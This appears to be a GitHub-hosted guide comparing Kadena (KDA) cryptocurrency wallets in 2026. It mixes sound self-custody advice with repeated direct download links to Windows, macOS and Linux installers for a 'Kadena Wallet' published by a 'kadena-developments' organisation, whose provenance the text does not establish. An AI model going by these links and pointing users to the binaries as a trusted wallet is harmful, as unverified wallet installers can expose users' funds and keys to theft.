![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Best Kadena Wallet in 2026: Every Option That Still Works</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

The honest answer to "which Kadena wallet is best" is that the question is underspecified. Four products survive, each good at one job, and none of them is good at all of them. A desktop application, a multi-asset wallet, a mobile app and a hardware device answer different needs, and the list you should trust is the short one that names a release date.

What follows is that short list, plus the tests that matter more than any brand.

## You'll see this if

- Every wallet list you find recommends something discontinued.
- You hold KDA and want to know whether your current wallet is still alive.
- You are choosing between a desktop app, a mobile app and a hardware device.
- Someone told you a wallet "supports Kadena" and you want to know what that claim includes.

## How the field shrank

Four dated events removed most of the options.

| Date | Event |
| --- | --- |
| 21 October 2025 | Kadena LLC announced it was ceasing business operations |
| 25 November 2025 | Koala removed KDA |
| 9 January 2026 | The Chainweaver repository was archived read-only |
| 13 August 2026 | eckoWALLET's latest published update, under a new publisher |

Chainweaver's last release was 2.2.3, in January 2023, and it never produced a Windows build: Linux package, macOS archive, virtual machine image. Recommending it as a default today means recommending an archived repo with three-year-old binaries.

eckoWALLET survived in a different form. It is now published by InFlux Technologies, sits at version 2.27.5 and describes itself as actively developed. The exchange that shared its name is gone, which is where the "everything closed" story comes from.

Koala is unambiguous: KDA support was withdrawn, and a wallet that no longer implements a chain cannot be recommended for it, whatever its interface was like.

## The surviving options, by job

| Job | Option | State |
| --- | --- | --- |
| Desktop, Kadena only | Kadena Wallet | One build per platform at the current tag |
| Multi-asset desktop | Zelcore | Version 8.41.0, November 2026 |
| Mobile | Linx | Current Android build; imports Koala, eckoWALLET and Chainweaver accounts |
| Hardware signing | Ledger with the Kadena app | App version 1.2.0, October 2025; outside Ledger Live |
| Browser extension | eckoWALLET | 2.27.5, August 2026, InFlux Technologies |
| Inside MetaMask | The Kadena Snap | Listed in MetaMask's Snaps Directory |

Everything outside that table is a fork without releases, a directory entry nobody updated, or a product that stopped implementing Kadena. When you meet one, look for a release date before you look at a screenshot.

## What the wallet has to do, before brand names

Set the marketing aside and a Kadena wallet has five obligations. Each is testable in minutes.

1. **Keep the key local.** If the phrase can be exported and restored elsewhere, the product is a tool. If it cannot, it is a custodian with different vocabulary.
2. **Name the account before money arrives.** You should be able to read the destination before funding it, not after.
3. **Expose the chain.** Twenty chains with separate state make a hidden selector a permanent support burden.
4. **Survive being left.** A wallet you can walk away from is a wallet you can trust with a balance.
5. **Never ask for the phrase after setup.** A request for words is the signature of theft, whatever the interface says.

A product can pass all five and still be wrong for you. It cannot fail one and be safe.

## Is there a mobile app?

The release publishes three desktop installers and nothing else: a Windows executable, a macOS disk image and a Linux archive. No iOS or Android build appears among its assets, so there is no phone version of this wallet to install.

The phone product people are pointed to for Kadena is a separate one, Linx, written to take over accounts created elsewhere in this ecosystem. A handset and a desktop can both sign for one balance provided they rebuild identical keys, which is why a restore test decides whether a pair of wallets is redundancy or merely two apps.

## The question people are really asking

Three different questions hide inside "which is best", and they have different answers.

**Can this wallet hold KDA at all?** Kadena support is not EVM support. That is why multi-chain wallets list dozens of assets and no KDA.

**Should I trust it with a balance I cannot replace?** Trust means the key stays yours, the software is maintained, and leaving is possible.

**Will it still open my accounts in three years?** Only a wallet you have restored elsewhere can answer that, which is why the restore test belongs before funding, not after.

## MetaMask, precisely

MetaMask is the most common wrong answer, and the detail changed recently enough to be worth stating exactly.

MetaMask's core wallet speaks EVM. KDA is a Chainweb asset, so it does not appear natively. There is a Kadena Snap, `mindsend/kadena-snap`, listed in MetaMask's own directory, announced August 2024 and audited by Veridise in September 2024.

So native KDA inside MetaMask is possible through that Snap, and only through it. Whether it still installs and signs in a current MetaMask build has not been independently tested, and no public Chainweb EVM network is documented for a custom-network entry; the documented EVM environment is a local development chain.

For a real balance, a Snap inserts a dependency between you and your keys. Reasonable for small amounts, poor for a position you care about.

## Two wallets, one account

A useful property of self-custody is that two wallets can control the same account if they derive the same keys. That makes redundancy possible and testing cheap.

Export the phrase from one, restore it in the other, compare addresses. Equal addresses mean either product can open the balance, and you can move between them without drama. Different addresses mean the two derive differently, which is worth discovering on an empty account rather than during an emergency.

## What to avoid

- **Wallets that ask for a phrase to verify or sync.** No legitimate product does this.
- **Recovery services.** Nobody can move funds from an account they do not control.
- **Aggregator lists.** A directory entry is not evidence that software exists or works.
- **Installers from mirrors.** Take the file from the publisher's release page and compare what arrived.
- **Wallets with no release in a year.** Maintenance is the feature that makes the others usable.

## FAQ

**Is Chainweaver still usable?**
It is archived, its final release is from January 2023, and it has no Windows build. Accounts created there remain valid and other wallets can import them with the right derivation.

**Does eckoWALLET still work for KDA?**
The extension is published and current, now under InFlux Technologies. Treat it as a wallet, not as a trading venue, because its exchange is gone.

**Is Koala an option?**
No. KDA was removed in November 2025. The phrase still matters because it opens the same accounts in other software.

**Do I need a hardware wallet?**
A device separates signing from the computer you browse on, which removes a class of malware risk. A paper copy of the phrase still has to exist, and a bad transaction still gets signed if you approve it.

**Which should a new holder choose?**
A maintained wallet that names the account, shows the chain and exports a phrase. On desktop that narrows quickly to Kadena Wallet, Zelcore, or eckoWALLET in a browser.

## Related reading

- What Kadena Wallet is, and what self-custody actually means
- Chainweaver alternative: what Kadena Wallet users should know
- Zelcore vs Kadena Wallet: multi-asset against Kadena-first
- Ledger and KDA: setup, paths and the Ledger Live gap

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Zelcore vs Kadena Wallet: Multi-Asset Against Kadena-First](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/zelcore-vs-kadena-wallet.md)
- [Kadena Wallet vs eckoWALLET: Desktop and Extension Compared](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kadena-wallet-vs-eckowallet.md)
- [Linx vs Kadena Wallet: Mobile Against Desktop](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/linx-vs-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
